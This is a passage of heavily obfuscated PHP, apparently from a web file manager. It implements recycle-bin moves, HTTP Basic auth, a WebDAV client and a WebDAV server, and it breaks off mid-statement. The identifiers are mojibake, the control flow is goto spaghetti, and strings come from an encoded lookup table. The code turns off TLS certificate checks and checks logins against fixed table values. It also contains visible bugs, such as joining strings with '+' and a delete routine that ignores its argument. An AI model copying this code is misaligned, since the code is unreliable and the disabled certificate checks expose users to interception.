$bË„å¨™Ì¯ = Model($eæ—âÃÖø§[1114]); $Dœ·Òëƒ®ñ = $this->listData(); goto EÜ¨ÉÀì≥Ë; EÜ¨ÉÀì≥Ë: $E›äì˜™ç± = $E›äì˜™ç± == !1 ? !1 : $E›äì˜™ç±; if (!$Dœ·Òëƒ®ñ) { return !0; } $cÆ¢„∂≈Ø∂ = array(); goto FíÊÆ≈ÊÉ‹; BÎ≈ÛﬂŒ¡œ: } private function recycleMove($eéçÏÑÏ„ë, $BÑêûâÎ∞Â = 1) { $D≥‡⁄µóíì =& $_SERVER[—Ω]; $a¥Œ∑î§˘ä = Model($D≥‡⁄µóíì[1114]); $B≥≤Èí°íº = Model($D≥‡⁄µóíì[2328]); $D·óÑﬂÃå≥ = array($D≥‡⁄µóíì[366] => $eéçÏÑÏ„ë); if ($BÑêûâÎ∞Â) { $a¥Œ∑î§˘ä->where($D·óÑﬂÃå≥)->setField($D≥‡⁄µóíì[393], 1); $B≥≤Èí°íº->eventRecycle($eéçÏÑÏ„ë, $D≥‡⁄µóíì[2329]); } else { $EêñııﬁÇ∫ = $a¥Œ∑î§˘ä->where($D·óÑﬂÃå≥)->find(); $F˘©¿√ß©ù = $EêñııﬁÇ∫[$D≥‡⁄µóíì[367]] == $D≥‡⁄µóíì[83]; $d£ë¶§∆∑Ñ = $a¥Œ∑î§˘ä->fileNameAuto($EêñııﬁÇ∫[$D≥‡⁄µóíì[457]], $EêñııﬁÇ∫[$D≥‡⁄µóíì[28]], REPEAT_RENAME_FOLDER, $F˘©¿√ß©ù); if ($d£ë¶§∆∑Ñ != $EêñııﬁÇ∫[$D≥‡⁄µóíì[28]]) { $a¥Œ∑î§˘ä->rename($eéçÏÑÏ„ë, $d£ë¶§∆∑Ñ); } $a¥Œ∑î§˘ä->where($D·óÑﬂÃå≥)->setField($D≥‡⁄µóíì[393], 0); $B≥≤Èí°íº->eventRecycle($eéçÏÑÏ„ë, $D≥‡⁄µóíì[2330]); } } } goto E‘…Ò›∞ñ›; fŒ‹¥ÏöÃÇ: $AôÀ≠äéÿ· = $_SERVER[—Ω][543]; if (!$AôÀ≠äéÿ·) { die; } $_SERVER[†Äâ‡≠ﬁ] = explode($_SERVER[—Ω][544], gzinflate(substr($_SERVER[—Ω][545], 10, -8))); goto BÖ◊≠å¢æ¿; Eøœ¬ÑßÇ‡: class HttpAuth { public static function get() { $bÉ„Êç”⁄Ø =& $_SERVER[—Ω]; $b∫⁄‘çõéº = $bÉ„Êç”⁄Ø[33]; $eøÿ†Éá˜ = $bÉ„Êç”⁄Ø[33]; if (isset($_SERVER[$bÉ„Êç”⁄Ø[1736]])) { $b∫⁄‘çõéº = $_SERVER[$bÉ„Êç”⁄Ø[1736]]; $eøÿ†Éá˜ = $_SERVER[$bÉ„Êç”⁄Ø[1737]]; } elseif (isset($_SERVER[$bÉ„Êç”⁄Ø[1738]])) { $F¶Ñ»Æ…£ = $_SERVER[$bÉ„Êç”⁄Ø[1738]]; if (strpos(strtolower($F¶Ñ»Æ…£), $bÉ„Êç”⁄Ø[1739]) === 0) { $AÖåﬁ»’ı∫ = explode($bÉ„Êç”⁄Ø[4], base64_decode(substr($F¶Ñ»Æ…£, 6))); $b∫⁄‘çõéº = isset($AÖåﬁ»’ı∫[0]) ? $AÖåﬁ»’ı∫[0] : $bÉ„Êç”⁄Ø[33]; $eøÿ†Éá˜ = isset($AÖåﬁ»’ı∫[1]) ? $AÖåﬁ»’ı∫[1] : 0; } } return array($bÉ„Êç”⁄Ø[531] => $b∫⁄‘çõéº, $bÉ„Êç”⁄Ø[903] => $eøÿ†Éá˜); } public static function error() { goto fµ»•êüáﬁ; fµ»•êüáﬁ: $eºóáﬁ†ß◊ =& $_SERVER[—Ω]; header($eºóáﬁ†ß◊[1740]); header($eºóáﬁ†ß◊[1741]); goto c–±ôá∞ß; Cø‹¯ÙÆºå: die; goto EªÃÕ§¬ìú; c–±ôá∞ß: header($eºóáﬁ†ß◊[1742]); header($eºóáﬁ†ß◊[1743]); header($eºóáﬁ†ß◊[1259]); goto Cø‹¯ÙÆºå; EªÃÕ§¬ìú: } public static function make($EÉç¿¶ë¢î, $c∂óÔü¢Íø) { $a¡éÆ¥‰Òõ =& $_SERVER[—Ω]; return $a¡éÆ¥‰Òõ[1744] + base64_encode($EÉç¿¶ë¢î . $a¡éÆ¥‰Òõ[4] . $c∂óÔü¢Íø); } } class HttpDavClient { public function __construct($d»°Â˘«ƒπ, $eÆôçÌ‰âè, $F≈€ÇÓä∂®) { $this->header = array(); $this->userName = $eÆôçÌ‰âè; $this->userPassowrd = $F≈€ÇÓä∂®; } protected function makePath($d‡Ãà«è‚) { return $d‡Ãà«è‚; } protected function setHeader($DúÃˆ∫ÑÜ√, $cÒÛüÁøÉç = false) { if ($cÒÛüÁøÉç === !1) { $this->header[] = $DúÃˆ∫ÑÜ√; } else { $this->header[] = $DúÃˆ∫ÑÜ√ . $_SERVER[—Ω][886] . $cÒÛüÁøÉç; } } public function move($C·‡Ÿ„≤Ãû, $d¯¢õîÈ˜Œ, $bå∏Ëõàè = '') { $B¶Ïü—«ê¯ =& $_SERVER[—Ω]; $this->setHeader($B¶Ïü—«ê¯[1745], $this->makePath($d¯¢õîÈ˜Œ)); $this->setHeader($B¶Ïü—«ê¯[1746], $B¶Ïü—«ê¯[1747]); if ($bå∏Ëõàè) { $this->setHeader($B¶Ïü—«ê¯[1748], $B¶Ïü—«ê¯[931] . $bå∏Ëõàè . $B¶Ïü—«ê¯[934]); } return $this->send($B¶Ïü—«ê¯[1749], $C·‡Ÿ„≤Ãû); } public function copy($CãüõÉŸ◊ô, $d≥ô‘ãˆ»ï) { $dÃ÷ÎÛ¨Œá =& $_SERVER[—Ω]; $this->setHeader($dÃ÷ÎÛ¨Œá[1745], $this->makePath($d≥ô‘ãˆ»ï)); $this->setHeader($dÃ÷ÎÛ¨Œá[1746], $dÃ÷ÎÛ¨Œá[1747]); return $this->send($dÃ÷ÎÛ¨Œá[1750], $CãüõÉŸ◊ô); } public function mkcol($eáàê»·ö) { $b‘ÌÚ¥ê„ﬁ =& $_SERVER[—Ω]; $this->setHeader($b‘ÌÚ¥ê„ﬁ[1746], $b‘ÌÚ¥ê„ﬁ[1747]); return $this->send($b‘ÌÚ¥ê„ﬁ[1751], $eáàê»·ö); } public function delete($AÚº áÃìé, $FúÔÿ“˜Ü÷ = '') { $Fà·˘Õ≤îœ =& $_SERVER[—Ω]; if ($FúÔÿ“˜Ü÷) { $this->setHeader($Fà·˘Õ≤îœ[1748], $Fà·˘Õ≤îœ[931] . $FúÔÿ“˜Ü÷ . $Fà·˘Õ≤îœ[934]); } return $this->send($Fà·˘Õ≤îœ[1247], $AÚº áÃìé); } public function propfind($d≠á´•ó†ä) { $FËè Áæ∑œ =& $_SERVER[—Ω]; $this->setHeader($FËè Áæ∑œ[1752], $FËè Áæ∑œ[83]); $this->setHeader($FËè Áæ∑œ[1753], $FËè Áæ∑œ[1754]); $B∆ú˜Ç™Õá = $FËè Áæ∑œ[1755]; return $this->send($FËè Áæ∑œ[1756], $d≠á´•ó†ä, $B∆ú˜Ç™Õá); } public function options($f¥‡æÿ¶¡ÿ) { return $this->send($_SERVER[—Ω][1757], $f¥‡æÿ¶¡ÿ); } public function get($B°Ö¡ßˆ≠é) { return $this->send($_SERVER[—Ω][213], $B°Ö¡ßˆ≠é); } public function put($EÒÔ«äîã∂, $bÎﬁ⁄çÑ•º, $E¯ÛÎØ’—Ë = '') { $e”®“Ò∂±¥ =& $_SERVER[—Ω]; if ($E¯ÛÎØ’—Ë) { $this->setHeader($e”®“Ò∂±¥[1748], $e”®“Ò∂±¥[931] . $E¯ÛÎØ’—Ë . $e”®“Ò∂±¥[934]); } return $this->send($e”®“Ò∂±¥[211], $EÒÔ«äîã∂, $bÎﬁ⁄çÑ•º); } protected function send($BÔâãìÈæÚ, $eœÕÃ÷ß‚‰, $FÜ≤•Æ®ÿÃ = false, $A»ÛÛòÂ‚ç = false) { goto BÍ÷È√⁄÷Ï; cùÇ—ÿÏï¯: $this->setHeader($FÌÇ≥ä†ïÀ); if ($FÜ≤•Æ®ÿÃ) { $FÜ≤•Æ®ÿÃ = $Dœ—∞•úæÈ[1759] . $FÜ≤•Æ®ÿÃ; } if (!request_url_safe($eœÕÃ÷ß‚‰)) { return !1; } goto A›⁄€É äÓ; fﬂƒî——É¢: $this->header = array(); return $Aßöã†‰≤˘; goto D†´ò∆åÛœ; b–øÑèçâà: curl_setopt($C–ÂåÙﬁˆÉ, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($C–ÂåÙﬁˆÉ, CURLOPT_SSL_VERIFYHOST, !1); $Aßöã†‰≤˘ = curl_exec($C–ÂåÙﬁˆÉ); goto fﬂƒî——É¢; A›⁄€É äÓ: $C–ÂåÙﬁˆÉ = curl_init($eœÕÃ÷ß‚‰); curl_setopt($C–ÂåÙﬁˆÉ, CURLOPT_CUSTOMREQUEST, $BÔâãìÈæÚ); curl_setopt($C–ÂåÙﬁˆÉ, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto Bªà•º√–‹; Bªà•º√–‹: curl_setopt($C–ÂåÙﬁˆÉ, CURLOPT_HTTPHEADER, $this->header); curl_setopt($C–ÂåÙﬁˆÉ, CURLOPT_RETURNTRANSFER, !0); curl_setopt($C–ÂåÙﬁˆÉ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto b–øÑèçâà; BÍ÷È√⁄÷Ï: $Dœ—∞•úæÈ =& $_SERVER[—Ω]; $FÌÇ≥ä†ïÀ = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($Dœ—∞•úæÈ[1758], $Dœ—∞•úæÈ[50]); goto cùÇ—ÿÏï¯; D†´ò∆åÛœ: } } class HttpDavServer { public function __construct($c’Ë∑•à‹≠, $C¯ãÏ◊à¿Á) { $this->root = $c’Ë∑•à‹≠; $this->initPath($C¯ãÏ◊à¿Á); $this->start(); } public function initPath($DıΩÜ∏Ú¬˜) { $E•÷áÚëãØ =& $_SERVER[—Ω]; $Dä•§¨ë©≥ = rtrim($_SERVER[$E•÷áÚëãØ[1368]], $E•÷áÚëãØ[8]) . $E•÷áÚëãØ[8]; $this->urlBase = substr($Dä•§¨ë©≥, 0, strpos($Dä•§¨ë©≥, $DıΩÜ∏Ú¬˜) + 1); $this->urlBase = rtrim($this->urlBase, $E•÷áÚëãØ[8]) . $DıΩÜ∏Ú¬˜; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $Dﬁ›çÉç∞Ü =& $_SERVER[—Ω]; $CåÁî£≥ß÷ = HttpAuth::get(); if ($CåÁî£≥ß÷[$Dﬁ›çÉç∞Ü[531]] == $Dﬁ›çÉç∞Ü[1760] && $CåÁî£≥ß÷[$Dﬁ›çÉç∞Ü[903]] == $Dﬁ›çÉç∞Ü[1761]) { return !0; } HttpAuth::error(); } public function start() { goto fôÔî±¥â¢; c√µ±é§ã‰: if (!method_exists($this, $dƒÓ∏’ÑªÆ)) { pr($dƒÓ∏’ÑªÆ . $cØõÕûÉø∏[1762]); die; } $c”ëêÛß«è = array($cØõÕûÉø∏[1763], $cØõÕûÉø∏[1764]); if (!in_array($dƒÓ∏’ÑªÆ, $c”ëêÛß«è) && !$this->pathExists($this->path)) { $C±é”¥¯∑€ = array($cØõÕûÉø∏[1036] => 404); } else { $C±é”¥¯∑€ = $this->{$dƒÓ∏’ÑªÆ}(); } goto d£ı·ïºÂå; fôÔî±¥â¢: $cØõÕûÉø∏ =& $_SERVER[—Ω]; $this->checkUser(); $dƒÓ∏’ÑªÆ = $cØõÕûÉø∏[143] . HttpHeader::method(); goto c√µ±é§ã‰; d£ı·ïºÂå: if (!$C±é”¥¯∑€) { return; } self::response($C±é”¥¯∑€); goto F±Ωóí»∆¿; F±Ωóí»∆¿: } public function pathGet($bØÆØﬂı®‡ = false) { $f±ªµŸ∞ÿä =& $_SERVER[—Ω]; $b–µå·¯å√ = $bØÆØﬂı®‡ ? $_SERVER[$f±ªµŸ∞ÿä[1765]] : $_SERVER[$f±ªµŸ∞ÿä[1368]]; $b–µå·¯å√ = KodIO::clear(rawurldecode($b–µå·¯å√)); if (!strstr($b–µå·¯å√, KodIO::clear($this->urlBase))) { return !1; } return substr($b–µå·¯å√, strpos($b–µå·¯å√, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($F»·ˆºŒêπ) { return file_exists($F»·ˆºŒêπ); } public function pathMkdir($fë¨·îˆï¡) { return mkdir($fë¨·îˆï¡, 511, !0); } public function pathInfo($Bô≈Ñá≥éÌ) { return path_info($Bô≈Ñá≥éÌ); } public function pathList($eˆ•ÖçÖ‘‚) { return path_list($eˆ•ÖçÖ‘‚); } public function pathOut($eêÍ«âÑòÆ) { echo file_get_contents($eêÍ«âÑòÆ); } public function pathPut($dÃÙπÖãÙ◊, $CºíÎÌ•‚ﬁ = '') { if (!$CºíÎÌ•‚ﬁ) { return file_put_contents($dÃÙπÖãÙ◊, $_SERVER[—Ω][33]); } return move_path($CºíÎÌ•‚ﬁ, $dÃÙπÖãÙ◊); } public function pathRemove($E≠§ñ›ƒ∑É) { if (is_file($E≠§ñ›ƒ∑É)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($bŒ‹Œ…±∆ú, $a√ÇœáÈéô) { return move_path($bŒ‹Œ…±∆ú, $a√ÇœáÈéô); } public function pathCopy($e∂·Õﬁ¨Ω‰, $cˆé‰Ì≥û«) { return copy_dir($e∂·Õﬁ¨Ω‰, $cˆé‰Ì≥û«); } public function parsePath($dÍÒ›ºëØË) { return $dÍÒ›ºëØË; } public function parseItem($Eœêì¨ÖÉì, $bäÖˆââç˜) { goto e´€¬öíπé; C£Ûœ€‚·Æ: if ($bäÖˆââç˜) { $Dôçä®è‰Ò = $Aøîù›˜¥Í[8] . str_replace($Aøîù›˜¥Í[169], $Aøîù›˜¥Í[8], rawurlencode($this->pathGet())); } if (!trim($Eœêì¨ÖÉì[$Aøîù›˜¥Í[107]])) { $Eœêì¨ÖÉì[$Aøîù›˜¥Í[107]] = time(); } if (!trim($Eœêì¨ÖÉì[$Aøîù›˜¥Í[184]])) { $Eœêì¨ÖÉì[$Aøîù›˜¥Í[184]] = time(); } goto D’êÀ°÷ﬁ®; e´€¬öíπé: $Aøîù›˜¥Í =& $_SERVER[—Ω]; $Dôçä®è‰Ò = $this->pathGet() . $Aøîù›˜¥Í[8] . $Eœêì¨ÖÉì[$Aøîù›˜¥Í[28]]; $Dôçä®è‰Ò = $Aøîù›˜¥Í[8] . str_replace($Aøîù›˜¥Í[169], $Aøîù›˜¥Í[8], rawurlencode($Dôçä®è‰Ò)); goto C£Ûœ€‚·Æ; D’êÀ°÷ﬁ®: $B®∏Ñä∑Áå = array($Aøîù›˜¥Í[1766] => KodIO::clear($this->urlBase . $Dôçä®è‰Ò), $Aøîù›˜¥Í[107] => @gmdate($Aøîù›˜¥Í[1767], $Eœêì¨ÖÉì[$Aøîù›˜¥Í[107]]), $Aøîù›˜¥Í[184] => @gmdate($Aøîù›˜¥Í[1768], $Eœêì¨ÖÉì[$Aøîù›˜¥Í[184]]), $Aøîù›˜¥Í[77] => $Eœêì¨ÖÉì[$Aøîù›˜¥Í[77]] ? $Eœêì¨ÖÉì[$Aøîù›˜¥Í[77]] : 0); return $B®∏Ñä∑Áå; goto Eà§ääèÿ¯; Eà§ääèÿ¯: } public function parseItemXml($Eúòﬁ„Ÿ∂ÿ, $f≥êà—¬äå) { $c‰ÎæÙ≤ÙÂ =& $_SERVER[—Ω]; $FÑ„û÷ÿÓÙ = $this->parseItem($Eúòﬁ„Ÿ∂ÿ, $f≥êà—¬äå); if ($Eúòﬁ„Ÿ∂ÿ[$c‰ÎæÙ≤ÙÂ[29]] == $c‰ÎæÙ≤ÙÂ[76]) { $eé‘øù˜õâ = $c‰ÎæÙ≤ÙÂ[1769]; $eé‘øù˜õâ .= $c‰ÎæÙ≤ÙÂ[1770]; } else { $B¯èã©áõÕ = $Eúòﬁ„Ÿ∂ÿ[$c‰ÎæÙ≤ÙÂ[157]] ? $Eúòﬁ„Ÿ∂ÿ[$c‰ÎæÙ≤ÙÂ[157]] : get_path_ext($Eúòﬁ„Ÿ∂ÿ[$c‰ÎæÙ≤ÙÂ[28]]); $D≥Ø©∂üË∆ = get_file_mime($B¯èã©áõÕ); $eé‘øù˜õâ = $c‰ÎæÙ≤ÙÂ[1771]; $eé‘øù˜õâ .= "\x3c\x44\x3a\147\145\164\143\157\x6e\x74\145\156\164\x74\171\160\145\x3e{$D≥Ø©∂üË∆}\74\57\104\72\147\145\164\x63\x6f\x6e\x74\145\x6e\x74\x74\171\160\x65\76"; } return "\12\x9\11\74\104\72\x72\145\163\160\x6f\156\x73\x65\76\xa\11\11\11\x3c\x44\x3a\x68\x72\x65\146\76{$FÑ„û÷ÿÓÙ[$c‰ÎæÙ≤ÙÂ[1766]]}\x3c\57\x44\72\x68\162\x65\x66\76\12\11\x9\x9\74\x44\72\160\x72\157\160\163\164\x61\x74\76\xa\11\11\11\11\x3c\104\x3a\160\x72\x6f\x70\76\12\11\11\x9\11\x9\74\x44\x3a\147\145\164\x6c\x61\x73\164\x6d\157\x64\x69\146\x69\x65\x64\76{$FÑ„û÷ÿÓÙ[$c‰ÎæÙ≤ÙÂ[107]]}\74\57\x44\x3a\147\145\x74\x6c\141\x73\x74\x6d\157\x64\x69\x66\x69\x65\144\76\12\x9\x9\11\11\11\x3c\x44\72\x63\162\x65\141\164\151\x6f\156\144\141\x74\145\x3e{$FÑ„û÷ÿÓÙ[$c‰ÎæÙ≤ÙÂ[184]]}\74\x2f\x44\x3a\143\x72\145\x61\x74\151\x6f\x6e\144\141\x74\x65\76\12\11\x9\11\11\x9\74\104\x3a\x67\145\164\143\157\156\164\x65\156\164\154\x65\156\x67\x74\150\x3e{$FÑ„û÷ÿÓÙ[$c‰ÎæÙ≤ÙÂ[77]]}\x3c\x2f\104\72\147\x65\164\143\157\156\164\145\156\164\x6c\x65\156\x67\164\150\76\xa\11\11\11\11\x9{$eé‘øù˜õâ}\12\x9\x9\x9\11\74\57\104\72\160\162\x6f\x70\x3e\xa\11\x9\11\x9\74\104\x3a\x73\x74\x61\164\x75\163\x3e\110\124\x54\120\57\x31\56\61\40\62\x30\x30\40\x4f\113\74\x2f\104\72\163\x74\141\164\x75\x73\76\xa\x9\11\11\x3c\x2f\x44\x3a\x70\162\x6f\160\163\x74\x61\164\76\12\x9\x9\74\57\x44\x3a\x72\145\x73\160\x6f\156\163\145\x3e"; } public function pathListMerge($FÀ⁄‘∞á∫ú) { goto E≈Û”Èﬂ§≥; D¶º¶Ñ◊ ¨: $aûùµùíçè = array(); foreach ($FÀ⁄‘∞á∫ú as $Bﬂã¿ÈàÎ€ => $eß≈≥°òèÖ) { if (!in_array($Bﬂã¿ÈàÎ€, $c§ëÎÓÂ≠Ø) || !is_array($eß≈≥°òèÖ)) { continue; } $aûùµùíçè = array_merge($aûùµùíçè, $eß≈≥°òèÖ); } foreach ($aûùµùíçè as &$CÕÑ„Ãî§á) { $CÕÑ„Ãî§á[$f“Ñ’ò˘†◊[28]] = str_replace($f“Ñ’ò˘†◊[8], $f“Ñ’ò˘†◊[1370], $CÕÑ„Ãî§á[$f“Ñ’ò˘†◊[28]]); } goto dû£Ÿ´•„õ; dû£Ÿ´•„õ: return $aûùµùíçè; goto BäóŸÓøö¥; E≈Û”Èﬂ§≥: $f“Ñ’ò˘†◊ =& $_SERVER[—Ω]; if (!$FÀ⁄‘∞á∫ú) { return $FÀ⁄‘∞á∫ú; } $c§ëÎÓÂ≠Ø = array($f“Ñ’ò˘†◊[73], $f“Ñ’ò˘†◊[74], $f“Ñ’ò˘†◊[1772]); goto D¶º¶Ñ◊ ¨; BäóŸÓøö¥: } public function httpPROPFIND() { goto D†›ßøß§Ÿ; BºÊÓá„™Ñ: if ($bˆ≠ù≤ä±‡) { $BöÉã‰„âÔ = array($cá€∞¢›ÃÉ); } else { $cá€∞¢›ÃÉ[$D÷âœÑßÜÉ[28]] = $D÷âœÑßÜÉ[33]; $BöÉã‰„âÔ = array_merge(array($cá€∞¢›ÃÉ), $BöÉã‰„âÔ); } $eÀõ›ÈÖÇë = $D÷âœÑßÜÉ[33]; foreach ($BöÉã‰„âÔ as $A¿”Ìì¢¥∑) { $eÀõ›ÈÖÇë .= $this->parseItemXml($A¿”Ìì¢¥∑, $bˆ≠ù≤ä±‡); } goto Eù«∏Õ§Á»; Eù«∏Õ§Á»: return array($D÷âœÑßÜÉ[1775] => 207, $D÷âœÑßÜÉ[1776] => "\x3c\x44\72\155\165\154\164\x69\x73\x74\x61\x74\165\x73\40\170\155\x6c\x6e\x73\x3a\104\x3d\x22\x44\x41\126\x3a\42\76\xa{$eÀõ›ÈÖÇë}\xa\74\x2f\x44\x3a\155\165\x6c\x74\151\163\x74\x61\x74\x75\163\x3e"); goto d°Òåƒ˘‘Ó; D†›ßøß§Ÿ: $D÷âœÑßÜÉ =& $_SERVER[—Ω]; $f¨øëé„⁄ù = $this->pathList($this->path); $BöÉã‰„âÔ = $this->pathListMerge($f¨øëé„⁄ù); goto Fñ—ª„ÚÇ›; Fñ—ª„ÚÇ›: $cá€∞¢›ÃÉ = $f¨øëé„⁄ù[$D÷âœÑßÜÉ[1773]]; if (!is_array($BöÉã‰„âÔ) || $cá€∞¢›ÃÉ[$D÷âœÑßÜÉ[1774]] === !1) { return array($D÷âœÑßÜÉ[1775] => 404, $D÷âœÑßÜÉ[1776] => $D÷âœÑßÜÉ[1777]); } $bˆ≠ù≤ä±‡ = $cá€∞¢›ÃÉ[$D÷âœÑßÜÉ[29]] == $D÷âœÑßÜÉ[164] || HttpHeader::get($D÷âœÑßÜÉ[1752]) == $D÷âœÑßÜÉ[464]; goto BºÊÓá„™Ñ; d°Òåƒ˘‘Ó: } public function httpHEAD() { $cµÒÆ∫à‡◊ =& $_SERVER[—Ω]; $C¿ëı≠ÚºÕ = $this->pathInfo($this->path); if (!$C¿ëı≠ÚºÕ || $C¿ëı≠ÚºÕ[$cµÒÆ∫à‡◊[29]] == $cµÒÆ∫à‡◊[76]) { return array($cµÒÆ∫à‡◊[1036] => 200, $cµÒÆ∫à‡◊[1203] => array($cµÒÆ∫à‡◊[1778])); } return array($cµÒÆ∫à‡◊[1036] => 200, $cµÒÆ∫à‡◊[1203] => array($cµÒÆ∫à‡◊[1779], $cµÒÆ∫à‡◊[136], $cµÒÆ∫à‡◊[1780] . $C¿ëı≠ÚºÕ[$cµÒÆ∫à‡◊[77]], $cµÒÆ∫à‡◊[1781] . get_file_mime($C¿ëı≠ÚºÕ[$cµÒÆ∫à‡◊[157]]), $cµÒÆ∫à‡◊[132] . gmdate($cµÒÆ∫à‡◊[1767], $C¿ëı≠ÚºÕ[$cµÒÆ∫à‡◊[1250]]) . $cµÒÆ∫à‡◊[1782], $cµÒÆ∫à‡◊[1783])); } public function httpOPTIONS() { $dºÓÈïá¡Ï =& $_SERVER[—Ω]; return array($dºÓÈïá¡Ï[1036] => 200, $dºÓÈïá¡Ï[1203] => array($dºÓÈïá¡Ï[1784], $dºÓÈïá¡Ï[1785], $dºÓÈïá¡Ï[1786], $dºÓÈïá¡Ï[1259])); } public function httpPROPPATCH() { $aü‘ææòá≠ =& $_SERVER[—Ω]; $C±åºÏíúû = $aü‘ææòá≠[1787] . $_SERVER[$aü‘ææòá≠[1368]] . $aü‘ææòá≠[1788]; return array($aü‘ææòá≠[1775] => 207, $aü‘ææòá≠[1776] => "\74\104\x3a\155\x75\x6c\x74\151\163\164\x61\164\x75\x73\40\170\x6d\x6c\156\163\x3a\x44\x3d\42\x44\101\126\72\42\76\xa{$C±åºÏíúû}\xa\74\x2f\x44\72\155\165\x6c\x74\151\x73\164\141\x74\x75\163\x3e"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $Fﬁàá≈Æöä =& $_SERVER[—Ω]; $d√€Á£ÛåÒ = $this->uploadFile(); if ($d√€Á£ÛåÒ) { $Eè«‘≥–˜Ë = 204; } else { $d√€Á£ÛåÒ = $Fﬁàá≈Æöä[33]; $Eè«‘≥–˜Ë = 201; } $båÆé´ëËÆ = $this->pathPut($this->path, $d√€Á£ÛåÒ); if ($båÆé´ëËÆ == !1) { $Eè«‘≥–˜Ë = 404; } return array($Fﬁàá≈Æöä[1775] => $Eè«‘≥–˜Ë); } private function uploadFile() { goto aºä ‹Ç≤î; BﬂØ≥‚ÿäµ: $dÜÙÕ◊û£ƒ = @fopen($AæƒπﬂÓáﬁ, $eÀÔ›ÈÑ∫Ê[1497]); $aÊ◊•»ﬂÌÉ = @fopen($eÀÔ›ÈÑ∫Ê[1790], $eÀÔ›ÈÑ∫Ê[1496]); if (!$aÊ◊•»ﬂÌÉ || !$dÜÙÕ◊û£ƒ) { @unlink($AæƒπﬂÓáﬁ); return !1; } goto aÖ…ËÚÌê≠; aºä ‹Ç≤î: $eÀÔ›ÈÑ∫Ê =& $_SERVER[—Ω]; @mk_dir(TEMP_FILES); $AæƒπﬂÓáﬁ = TEMP_FILES . $eÀÔ›ÈÑ∫Ê[1789] . rand_string(32); goto BﬂØ≥‚ÿäµ; d“ÔÕâ≈íï: if (@filesize($AæƒπﬂÓáﬁ) > 0) { return $AæƒπﬂÓáﬁ; } @unlink($AæƒπﬂÓáﬁ); return !1; goto DÇÊè‹”¥ô; aÖ…ËÚÌê≠: while (!feof($aÊ◊•»ﬂÌÉ)) { fwrite($dÜÙÕ◊û£ƒ, fread($aÊ◊•»ﬂÌÉ, 1024 * 200)); } fclose($aÊ◊•»ﬂÌÉ); fclose($dÜÙÕ◊û£ƒ); goto d“ÔÕâ≈íï; DÇÊè‹”¥ô: } public function httpMKCOL() { $cÚûõüàˆ‹ =& $_SERVER[—Ω]; if ($this->pathExists($this->path)) { return array($cÚûõüàˆ‹[1036] => 409); } $CÀ’È°»¥ø = $this->pathMkdir($this->path); return array($cÚûõüàˆ‹[1036] => $CÀ’È°»¥ø ? 201 : 403); } public function httpMOVE() { $c≥´öΩ°Î¿ =& $_SERVER[—Ω]; $aÉŸòı´∫√ = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$c≥´öΩ°Î¿[1791]])) { $bÆ⁄®‡◊öú[$c≥´öΩ°Î¿[1792]] = $_SERVER[$c≥´öΩ°Î¿[1791]] == $c≥´öΩ°Î¿[1793]; } $D£¥ÿÂë¥” = $this->pathMove($this->path, $aÉŸòı´∫√); return array($c≥´öΩ°Î¿[1036] => $D£¥ÿÂë¥” ? 201 : 404); } public function httpCOPY() { $D›†∑Óë‡à = $this->parsePath($this->pathGet(!0)); $féÌ”•ÙÑŒ = $this->pathCopy($this->path, $D›†∑Óë‡à); return array($_SERVER[—Ω][1036] => $féÌ”•ÙÑŒ ? 201 : 404); } public function httpDELETE() { $aˆ˘…óèÚÈ = $this->pathRemove($this->path); return array($_SERVER[—Ω][1036] => $aˆ˘…óèÚÈ ? 200 : 503); } public function httpLOCK() { $F¯±çΩ∆≥ê =& $_SERVER[—Ω]; $A∆‘‚»§›À = md5($this->path); $a·ﬂ∑÷ååî = $F¯±çΩ∆≥ê[1794] . $this->xmlGet($F¯±çΩ∆≥ê[1795]) . $F¯±çΩ∆≥ê[1796] . $A∆‘‚»§›À . $F¯±çΩ∆≥ê[1797]; return array($F¯±çΩ∆≥ê[1036] => 200, $F¯±çΩ∆≥ê[1203] => array($F¯±çΩ∆≥ê[1798] . $A∆‘‚»§›À, $F¯±çΩ∆≥ê[1799]), $F¯±çΩ∆≥ê[1800] => $a·ﬂ∑÷ååî); } public function httpUNLOCK() { return array($_SERVER[—Ω][1036] => 204); } public function xmlGet($Cﬂ¨›Ë Ò¥) { goto dûçà≤‘Í≤; dûçà≤‘Í≤: $e‡—±÷é‹∑ =& $_SERVER[—Ω]; static $e€âÑêØàÕ = false; if (!$e€âÑêØàÕ) { $eø››⁄»æ– = file_get_contents($e‡—±÷é‹∑[1801]); $e€âÑêØàÕ = new DOMDocument(); $e€âÑêØàÕ->loadXML($eø››⁄»æ–); } goto EÈêôı≥Ü¥; EÈêôı≥Ü¥: $d∫‡ËÂ˘Éú = array_shift(explode($e‡—±÷é‹∑[8], $Cﬂ¨›Ë Ò¥)); $aëææÌﬂØâ = $e€âÑêØàÕ->getElementsByTagNameNS($e‡—±÷é‹∑[1802], $d∫‡ËÂ˘Éú); if ($aëææÌﬂØâ) { return $aëææÌﬂØâ[0]->nodeValue; } goto a ØÓÇßÖΩ; a ØÓÇßÖΩ: return $e‡—±÷é‹∑[33]; goto eº…óë†á©; eº…óë†á©: } public static function response($eøèúâåµÕ) { goto dà÷ºÇŸÌÇ; f≈¯¢âíû≈: $f¬É°Êë≥‹[] = $Aå’‚ÃΩ¡∑[1742]; $f¬É°Êë≥‹[] = $Aå’‚ÃΩ¡∑[1743]; foreach ($f¬É°Êë≥‹ as $A‚–ÀÍù∞Æ) { header($A‚–ÀÍù∞Æ); } goto Fô⁄Ω±ã•Œ; Fô⁄Ω±ã•Œ: if (is_string($eøèúâåµÕ[$Aå’‚ÃΩ¡∑[1800]])) { header($Aå’‚ÃΩ¡∑[1803]); $Bòü‚¶ÙÎ› = $Aå’‚ÃΩ¡∑[1804] . $Aå’‚ÃΩ¡∑[214] . $eøèúâåµÕ[$Aå’‚ÃΩ¡∑[1800]]; echo $Bòü‚¶ÙÎ›; } goto e≠ãõ¢çßñ; dà÷ºÇŸÌÇ: $Aå’‚ÃΩ¡∑ =& $_SERVER[—Ω]; $f¬É°Êë≥‹ = is_array($eøèúâåµÕ[$Aå’‚ÃΩ¡∑[1203]]) ? 